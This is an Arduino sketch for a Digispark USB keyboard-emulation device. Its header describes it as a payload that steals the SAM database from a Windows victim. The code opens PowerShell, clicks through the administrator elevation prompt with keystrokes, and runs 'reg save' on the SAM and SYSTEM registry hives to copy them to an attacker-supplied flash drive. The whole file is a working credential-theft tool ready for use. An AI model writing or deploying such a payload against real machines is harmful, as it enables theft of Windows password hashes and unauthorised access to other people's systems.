/**
 * @file SAMDump.ino
 * @brief This payload steals SAM DB from a Windows victim.
 * 
 * @copyright Copyright (c) Noé Ruano 2024
 * 
 */

#define LAYOUT_SPANISH	/* Change to whichever layout you need (LAYOUT_{US_ENGLISH, NORWEGIAN, ITALIAN, etc.}) */

#define FS ""	// TODO: Your flash drive's location to which copy the SAM

#include <DigiKeyboard.h>
#define DELAY 1000

void setup() { }

void loop()
{
	// A first delay so that we don't miss the first keyboard stroke
	DigiKeyboard.delay(500);

	// Open a powershell window (WIN+R)
	DigiKeyboard.sendKeyStroke(KEY_R, MODIFIERKEY_GUI);
	DigiKeyboard.delay(DELAY);
	DigiKeyboard.printf("powershell");
	// Run as administrator
	DigiKeyboard.sendKeyStroke(KEY_ENTER, MODIFIERKEY_LEFT_CTRL | MODIFIERKEY_LEFT_SHIFT);
	DigiKeyboard.delay(DELAY);
	// Accept "Run as administrator" dialog
	DigiKeyboard.sendKeyStroke(KEY_LEFT);
	DigiKeyboard.delay(DELAY);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(DELAY);

	// Extract SAM and SYSTEM registry keys
	DigiKeyboard.printf("reg save HKLM\\sam %s\\sam", FS);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(DELAY);
	DigiKeyboard.printf("reg save HKLM\\system %s\\system", FS);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(DELAY);

	// Close powershell window
	DigiKeyboard.sendKeyStroke(KEY_F4, MODIFIERKEY_LEFT_ALT);

	for (;;) { }
}

